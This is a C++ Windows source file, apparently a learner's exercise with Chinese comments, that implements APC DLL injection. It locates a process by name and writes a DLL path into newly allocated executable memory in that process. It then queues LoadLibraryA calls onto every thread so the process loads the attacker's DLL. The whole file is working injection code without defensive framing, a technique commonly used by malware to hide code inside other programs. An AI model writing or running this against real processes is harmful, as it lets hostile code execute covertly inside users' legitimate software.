#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <vector>
using namespace std;

DWORD GetProcessPid(char *ProcessName);
std::vector<DWORD> GetThreadTid(DWORD Pid);

int main(int argc, char* arg[])
{
	// 1. get target process
	DWORD Pid = GetProcessPid(arg[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// 2. write dll route into target process
	LPVOID AllocMemory = VirtualAllocEx(hProcess, NULL, lstrlen(arg[2]) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);	//没注进去是这个最后一个参数设置的问题

	// 3. write dll route into process
	WriteProcessMemory(hProcess, AllocMemory, arg[2], lstrlen(arg[2]) + 1, NULL);
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");

	// 4. find all threads belong to target process.
	std::vector<DWORD> ThreadTids = GetThreadTid(Pid);

	//5. Inject APC into all threads of target process
	for (DWORD threadId : ThreadTids) // 将所有的线程都插入APC调用.
	{
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)pfnStartAddr, hThread, (ULONG_PTR)AllocMemory);	// 类似 CreateRemoteThread, 入口放在LoadLibrary.
		// Sleep(10 * 2); 这个并不能让线程进入Alert状态, 要在shellcode里写这个让目标Thread执行才行. 同理 NtTestAlert
		cout << threadId << "APC_Dll injection successful" << endl;
		CloseHandle(hThread);
	}
	CloseHandle(hProcess);
	return 0;
}

DWORD GetProcessPid(char *ProcessName)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(ProcessName, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return ProcessID;

}

std::vector<DWORD> GetThreadTid(DWORD Pid)
{
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  // 线程快照
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	HANDLE threadHandle = NULL;
	if (Thread32First(hThreadSnap, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == Pid) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hThreadSnap, &threadEntry));
	}
	return threadIds;
}

